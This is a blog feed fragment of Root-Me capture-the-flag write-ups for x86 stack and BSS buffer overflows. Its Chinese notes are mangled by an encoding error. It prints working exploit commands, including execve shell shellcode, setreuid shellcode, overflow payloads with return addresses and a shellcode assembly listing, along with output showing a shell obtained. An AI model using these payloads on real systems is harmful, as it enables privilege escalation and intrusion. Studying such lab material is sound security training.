summary:</p><ul><li>%ebp - 540â€‹ | env.homeâ€‹â€‹ â€‹â€‹</li><li>%ebp - 412 | env.username</li><li>%ebp - 284 | env.shell</li><li>%ebp - 156 | env.path</li><li>%ebp | saved frame pointer</li><li>%ebp + 4 | saved EIP</li><li>%ebp + 8 | rep movsl destination address</li></ul><p>var char *dest @ ebp-0x21c</p><p>0x08048590 e8dbfdffff     sym.imp.strcpy ();[og] ç¬¬äºŒæ¬¡çš„èµ‹å€¼ï¼ŒUSERNAME</p><pre><code>gdb-peda$ x/101xw 0xbffff3cc å­˜è¾“å…¥å€¼0xbffff3cc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3dc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3ec:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3fc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff40c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff41c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff42c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff43c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff44c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff45c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff46c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff47c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff48c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff49c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4ac:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4bc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4cc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4dc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4ec:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4fc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff50c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff51c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff52c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff53c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff54c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff55c:     0x0804a000</code></pre><p><code>EAX: 0xbffff44c (&#39;a&#39; &lt;repeats 200 times&gt;...)</code><br>å­˜shell å­—ç¬¦ä¸²</p><p><code>EAX: 0xbffff4cc (&#39;a&#39; &lt;repeats 128 times&gt;, &quot;e\377\377\277&quot;, &#39;a&#39; &lt;repeats 12 times&gt;)</code><br>æ”¾path</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> disas GetEnv</span></span><br><span class="line">[...] # How much memory is allocated?</span><br><span class="line">0x080484aa &lt;+6&gt;:        sub    $0x22c,%esp      # (1)</span><br><span class="line">[...] # Let&#x27;s see what happens after the last &#x27;strcpy&#x27; call...</span><br><span class="line">   0x080485c0 &lt;+284&gt;:        call   0x8048390 &lt;strcpy@plt&gt; </span><br><span class="line">   0x080485c5 &lt;+289&gt;:        mov    0x8(%ebp),%eax # (2-dest)</span><br><span class="line">   0x080485c8 &lt;+292&gt;:        lea    -0x21c(%ebp),%edx # (3-source)</span><br><span class="line">   0x080485ce &lt;+298&gt;:        mov    $0x200,%ebx # (4-length) </span><br><span class="line">[...] # Some alignment details skipped...</span><br><span class="line">   0x08048602 &lt;+350&gt;:        mov    %ebx,%ecx # (4-length)</span><br><span class="line">   0x08048604 &lt;+352&gt;:        shr    $0x2,%ecx # (4-length)</span><br><span class="line">   0x08048607 &lt;+355&gt;:        mov    %eax,%edi # (2-dest)</span><br><span class="line">   0x08048609 &lt;+357&gt;:        mov    %edx,%esi # (3-source)</span><br><span class="line">   0x0804860b &lt;+359&gt;:        rep movsl %ds:(%esi),%es:(%edi)</span><br></pre></td></tr></table></figure><ul><li><p> program allocates 0x22c = 556 bytes (an EnvInfo struct is around 512 bytes long),</p></li><li><p> rep movsl â€¦ instruction at the end of the function, which consists of copying <strong>n long words **from %esi to %edi, with n being the value stored in **%ecx</strong> ;</p></li><li><p>it loads an address located at %ebp + 8 into the %edi register (destination address)</p></li><li><p>it loads the address of %ebp - 540 (0x21c = 540) into the %esi register (source address)</p></li><li><p>%ecx is initially set <strong>to 0x200(512) **and then **divided by 4 (shr $2)</strong>, i.e., %ecx <strong>equals 128</strong>. Hence, 128 long (4-bytes) words will be copied, resulting in the 512 bytes of the 4 buffers of an EnvInfo struct.</p><p>in order to output its EnvInfo struct, GetEnv <strong>creates a local struct</strong> where it stores the data first, and then, in its prologue**, GetEnv actually replicates the local struct into a â€œremoteâ€ struct, l<strong>ocated at the address read **at %ebp + 8</strong><br>è¿˜è¦å¤åˆ¶ç»“æ„ä½“</p></li></ul><p><code> $PATH=$(python -c &#39;print &quot;/usr/local/bin:&quot; + &quot;A&quot; * (164-16)&#39;) peda -ex &quot;run&quot; ./ch8</code><br>è¿™å‘½ä»¤</p><p>å¦‚æœæ‰“å°420ï¼ˆ412+4 =416 åœ¨è¿™é‡Œè¾“å…¥4ä¸ªå­—èŠ‚ï¼Œæ€»é•¿å˜ä¸º420ï¼‰ aï¼Œæº¢å‡º</p><pre><code>gdb-peda$ x/16xb 0xbffff55c0xbffff55c:     0x61    0x61    0x61    0x61    0x00    0xf5    0xff    0xbf</code></pre><p>pathåé¢è·Ÿç€ä¸€ä¸ªnull \00<br>ä¼šæ”¹å˜æŒ‡é’ˆå€¼ï¼Œç»“æ„ä½“èµ‹å€¼åˆ°$ebp+8æŒ‡å‘çš„åœ°å€å¤„</p><p>æ‰“å°416 a</p><pre><code>0xbffff55c:     0x08048600      0xbffff570</code></pre><p>æ²¡æœ‰æ”¹å˜ebp+8<br>è¿™ä¸ªåœ°å€æ˜¯mainä¸­envç»“æ„ä½“åœ°å€</p><h2 id="æˆ–è€…é‡æ–°åˆ†é…512å­—èŠ‚å¯å†™ç©ºé—´"><a href="#æˆ–è€…é‡æ–°åˆ†é…512å­—èŠ‚å¯å†™ç©ºé—´" class="headerlink" title="æˆ–è€…é‡æ–°åˆ†é…512å­—èŠ‚å¯å†™ç©ºé—´"></a>æˆ–è€…é‡æ–°åˆ†é…512å­—èŠ‚å¯å†™ç©ºé—´</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> * ptr;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = getenv(argv[<span class="number">1</span>]);</span><br><span class="line">        ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>])) * <span class="number">2</span>;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code> cd /tmp; gcc -m32 -o find_env find_env.c; cd -</code></p><pre><code>app-systeme-ch8@challenge02:~$ export SHELLCODE=`python -c &quot;print &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39;&quot;`app-systeme-ch8@challenge02:~$ export JUNK=`python -c &quot;print &#39;B&#39; * 1000&quot;`app-systeme-ch8@challenge02:~$ /tmp/find_env SHELLCODE ./ch8SHELLCODE will be at 0xbffff931app-systeme-ch8@challenge02:~$ /tmp/find_env JUNK ./ch8JUNK will be at 0xbffffb2b</code></pre><p><code>export PATH=</code>python -c â€œprint â€˜Aâ€™*160 + â€˜\x31\xf9\xff\xbfâ€™ + â€˜\x2b\xfb\xff\xbfâ€™â€``</p><hr><p>æˆ‘ä»¬å°†shellcodeæ”¾åœ¨USERNAMEä¸Šï¼Œæˆ‘è¯•äº†å‡ ä¸ªshellcodeï¼Œåªæœ‰è¿™ä¸ªæœ‰ç”¨ï¼Œ</p><pre><code>export USERNAME=`python -c &#39;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#39;`</code></pre><p>æ€»é•¿33å­—èŠ‚</p><p>ç„¶åæº¢å‡ºPATHï¼Œè¦ä¿è¯$ebp+8çš„å€¼ä¸å˜ï¼ˆå°ç«¯åºï¼‰ï¼Œ<br>pathé•¿119ï¼Œå†å¡«å……ä¸€ä¸ª<code>ï¼š</code>ï¼Œä¿æŒä¸º4çš„å€æ•°ï¼Œ</p><pre><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/:`python -c &#39;print(&quot;\x6c\xf5\xff\xbf&quot;*11+&quot;\x50\xf7\xff\xbf&quot;)&#39;`</code></pre><p><code>0xbfff56c</code>æ˜¯USERNAMEåœ°å€ï¼Œ<code>0xbffff750</code>æ˜¯$ebp+8çš„å€¼ï¼Œç°åœ¨PATHæ€»é•¿168ã€‚</p><pre><code>app-systeme-ch8@challenge02:~$ ./ch8[+] Getting env...bash-4.4$ cat .passwd</code></pre><h2 id="å­¦åˆ°çš„å‘½ä»¤"><a href="#å­¦åˆ°çš„å‘½ä»¤" class="headerlink" title="å­¦åˆ°çš„å‘½ä»¤"></a>å­¦åˆ°çš„å‘½ä»¤</h2><h3 id="è®¾ç½®ç¯å¢ƒå˜é‡"><a href="#è®¾ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="è®¾ç½®ç¯å¢ƒå˜é‡"></a>è®¾ç½®ç¯å¢ƒå˜é‡</h3><p><code>export USERNAME=</code></p><p>gdbä¸­<br><code>set env USERNAME=</code></p><p>æŸ¥çœ‹<br><code>x/x env.path</code></p><h3 id="æŸ¥çœ‹ç¯å¢ƒå˜é‡é•¿åº¦"><a href="#æŸ¥çœ‹ç¯å¢ƒå˜é‡é•¿åº¦" class="headerlink" title="æŸ¥çœ‹ç¯å¢ƒå˜é‡é•¿åº¦"></a>æŸ¥çœ‹ç¯å¢ƒå˜é‡é•¿åº¦</h3><p><code>echo $&#123;#PATH&#125;</code></p><hr><p><code>gdb-peda$ print $ebp-0xbffff55c</code></p><p><code>disas GetEnv</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-stack-buffer-overflow-basic-4&quot;&gt;&lt;a href=&quot;#ELF-x86-stack-buffer-overflow-basic-4&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - stack buffer overflow basic 4&quot;&gt;&lt;/a&gt;ELF x86 - stack buffer overflow basic 4&lt;/h1&gt;&lt;p&gt;å‚è€ƒ: &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204&quot;&gt;https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md&quot;&gt;https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://showlinkroom.me/2017/12/04/Root-me-App-System02/&quot;&gt;http://showlinkroom.me/2017/12/04/Root-me-App-System02/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution&quot;&gt;https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;é€†å‘&quot;&gt;&lt;a href=&quot;#é€†å‘&quot; class=&quot;headerlink&quot; title=&quot;é€†å‘&quot;&gt;&lt;/a&gt;é€†å‘&lt;/h2&gt;&lt;p&gt;&lt;code&gt;struct EnvInfo GetEnv(void)&amp;#123;&amp;#125;&lt;/code&gt; ä¸­æœ‰&lt;code&gt;strcpy()&lt;/code&gt;å‡½æ•°ï¼Œå­˜åœ¨æº¢å‡ºç‚¹ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;            +----------------------------+
            |      HOME env variable     |     %ebp - 540
            +----------------------------+
            |    USERNAME env variable   |     %ebp - 412
            +----------------------------+
            |      SHELL env variable    |     %ebp - 284
            +----------------------------+
            |      PATH env variable     |     %ebp - 156
            +----------------------------+
            |           saved ebp        |
            +----------------------------+
            |        return address      |     %ebp + 4
            +----------------------------+
            |   rep movsl dest. address  |     %ebp + 8
            +----------------------------+  &lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - BSS buffer overflow &amp; æ„é€ shellcode</title>
    <link href="http://finsenty54.github.io/2020/12/28/BSS_buffer_overflow/"/>
    <id>http://finsenty54.github.io/2020/12/28/BSS_buffer_overflow/</id>
    <published>2020-12-28T12:24:01.000Z</published>
    <updated>2020-12-28T13:11:00.839Z</updated>
    
    <content type="html"><![CDATA[<p>ELF x86 - BSS buffer overflow &amp; æ„é€ shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> username[<span class="number">512</span>] = &#123;<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">void</span> (*_atexit)(<span class="keyword">int</span>) =  <span class="built_in">exit</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cp_username</span><span class="params">(<span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span>((*(name++) = *(arg++)));</span><br><span class="line">  *name = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Usage : %s &lt;username&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">  cp_username(username, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Running program with username : %s\n&quot;</span>, username);</span><br><span class="line">   </span><br><span class="line">  _atexit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>å‚è€ƒï¼š<a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20BSS%20buffer%20overflow">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20BSS%20buffer%20overflow</a></p><p>The atexit and the username are global variables. Therefore, those variables positioned at the .bss section.</p><p>r2æŸ¥çœ‹</p><pre><code>0x0804a040 512 obj.username0x0804a240 4 obj._atexit</code></pre><p>ç”¨usernameæº¢å‡ºexitï¼Œæ§åˆ¶EIP</p><pre><code>./ch7 `python -c &quot;print &#39;\x6A\x46\x31\xDB\x80\xC7\x04\x80\xC3\xB7\x89\xD9\x58\xCD\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39; + &#39;A&#39;*474 + &#39;\x40\xa0\x04\x08&#39;&quot;`</code></pre><p>shellcodeæ”¾åœ¨å¼€å¤´ã€‚</p><p><a href="http://www.kernel-panic.it/security/shellcode/shellcode5.html">http://www.kernel-panic.it/security/shellcode/shellcode5.html</a><br>ç”Ÿæˆshellcode:<br>execve(â€œ/bin//shâ€, [â€œ/bin//shâ€], NULL)</p><ol><li>a pointer to the name of the program to execute (in our case a pointer to the string <code>&quot;/bin/sh&quot;</code>);</li><li>a pointer to an array of strings to pass as <code>arguments </code>to the program (the first argument must be<code> argv[0]</code>, i.e. the name of the program itself). The <code>last element </code>of the array must be <code>a null pointer</code>;</li><li>a pointer to an array of strings to pass as environment to the program. These strings are usually in the form â€œkey=valueâ€ and the last element must be a null pointer.</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *args[<span class="number">2</span>];</span><br><span class="line">        args[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">        args[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execve(args[<span class="number">0</span>], args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘è¿è¡Œï¼š</p><pre><code>â”Œâ”€[zentreisender@parrotos]â”€[~/Documents/root_me/app_system]â””â”€â”€â•¼ $./get_shell $ ls</code></pre><p>éœ€è¦è§£å†³çš„é—®é¢˜ï¼š</p><ol><li>shellcodeä¸­ä¸èƒ½æœ‰NULLå­—ç¬¦</li><li>éœ€è¦â€™/bin/shâ€™çš„åœ°å€</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jmp <span class="keyword">short</span> mycall      ; Immediately jump to the call instruction</span><br><span class="line"></span><br><span class="line">shellcode:</span><br><span class="line">    pop   esi         ; Store the address of <span class="string">&quot;/bin/sh&quot;</span> in ESI</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">mycall:</span><br><span class="line">    call  shellcode   ; Push the address of the next byte onto the <span class="built_in">stack</span>: the next</span><br><span class="line">    db    <span class="string">&quot;/bin/sh&quot;</span>   ;   byte is the beginning of the <span class="built_in">string</span> <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">get_shell.<span class="keyword">asm</span></span><br><span class="line">jmp <span class="keyword">short</span>    mycall               ; Immediately jump to the call instruction</span><br><span class="line"></span><br><span class="line">shellcode:</span><br><span class="line">    pop        esi                ; Store the address of <span class="string">&quot;/bin/sh&quot;</span> in ESI</span><br><span class="line">    <span class="keyword">xor</span>        eax, eax           ; Zero out EAX é€šè¿‡EAXè·å¾—<span class="literal">NULL</span></span><br><span class="line">    mov byte   [esi + <span class="number">7</span>], al      ; Write the null byte at the end of the <span class="built_in">string</span> åœ¨å­—ç¬¦ä¸²åæ·»åŠ ç»ˆç»“ç¬¦</span><br><span class="line">    mov dword  [esi + <span class="number">8</span>],  esi    ; [ESI+<span class="number">8</span>], i.e. the memory immediately below the <span class="built_in">string</span></span><br><span class="line">                                  ;   <span class="string">&quot;/bin/sh&quot;</span>, will contain the <span class="built_in">array</span> pointed to by the</span><br><span class="line">                                  ;   <span class="function">second argument of <span class="title">execve</span><span class="params">(<span class="number">2</span>)</span></span>; therefore we store in</span><br><span class="line">                                  ;   [ESI+<span class="number">8</span>] the address of the <span class="built_in">string</span>...</span><br><span class="line">    mov dword  [esi + <span class="number">12</span>], eax    ; ...<span class="keyword">and</span> in [ESI+<span class="number">12</span>] <span class="function">the <span class="literal">NULL</span> <span class="title">pointer</span> <span class="params">(EAX is <span class="number">0</span>)</span></span></span><br><span class="line">    mov        al,  0xb           ; Store the number of the syscall (11) in EAX</span><br><span class="line">    lea        ebx, [esi]         ; Copy the address of the <span class="built_in">string</span> in EBX å‚æ•°</span><br><span class="line">    lea        ecx, [esi + <span class="number">8</span>]     ; <span class="function">Second argument to <span class="title">execve</span><span class="params">(<span class="number">2</span>)</span></span></span><br><span class="line">    lea        edx, [esi + 12]    ; Third argument to execve(2) (NULL pointer)</span><br><span class="line">    <span class="keyword">int</span>        <span class="number">0x80</span>               ; Execute the system call</span><br><span class="line"></span><br><span class="line">mycall:</span><br><span class="line">    call       shellcode          ; Push the address of <span class="string">&quot;/bin/sh&quot;</span> onto the <span class="built_in">stack</span></span><br><span class="line">    db         <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure><pre><code>$ nasm -f elf get_shell.asm$ ojdump -d get_shell.o</code></pre><p>æ±‡ç¼–åå¾—åˆ°å¯¹è±¡æ–‡ä»¶ï¼ŒæŸ¥çœ‹æœºå™¨ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app-systeme-ch7@challenge02:~$ .&#x2F;ch7 &#96;python -c &quot;print &#39;\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&#39; + &#39;A&#39;*474 + &#39;\x40\xa0\x04\x08&#39;&quot;&#96;</span><br><span class="line">[+] Running program with username : Ã«^1Ã€Ë†Fâ€°â€°F</span><br><span class="line">Â°</span><br><span class="line">Â Â Â V</span><br><span class="line"> Ì€Ã¨Ã£Ã¿Ã¿Ã¿&#x2F;bin&#x2F;shAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@Â </span><br><span class="line">$ ls</span><br><span class="line">Makefile  ch7  ch7.c</span><br><span class="line">$ cat .passwd</span><br><span class="line">cat: .passwd: Permission denied</span><br></pre></td></tr></table></figure><p>shellcodeæƒé™ä¸è¶³</p><p><a href="http://shell-storm.org/shellcode/files/shellcode-599.php">http://shell-storm.org/shellcode/files/shellcode-599.php</a><br>\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80<br>å°†0x17 æ”¹ä¸º0x46<br>When the permissions are setted to â€œsâ€ instead of â€œSâ€ a classic shellcode does not set EUID and UID of the current process to old UID (here app-systeme-ch7-cracked):<br>0x46 â€œsys_setreuid16â€ not the classic 0x17 â€œsys_setuid16â€ </p><hr><p>ç»“æ„ä¸­å‡½æ•°æŒ‡é’ˆ<br>struct Dog {<br>    char name[12];<br>    void (<em>bark)();<br>    void (*bringBackTheFlag)();<br>    void (*death)(struct Dog</em>);<br>};</p><p><a href="https://cc-sir.github.io/2019/01/11/use_after_free/">https://cc-sir.github.io/2019/01/11/use_after_free/</a></p><p>use_after_freeå°±æ˜¯å…¶å­—é¢æ‰€è¡¨è¾¾çš„æ„æ€ï¼Œå½“ä¸€ä¸ªå†…å­˜å—è¢«é‡Šæ”¾ä¹‹åå†æ¬¡è¢«ä½¿ç”¨ã€‚ä½†æ˜¯å…¶å®è¿™é‡Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µ:<br>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULL ï¼Œ ç„¶åå†æ¬¡ä½¿ç”¨ï¼Œè‡ªç„¶ç¨‹åºä¼šå´©æºƒã€‚<br>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸ºNULLï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬ã€‚<br>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸ºNULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜ã€‚<br>è€Œæˆ‘ä»¬ä¸€èˆ¬æ‰€æŒ‡çš„ Use After Free 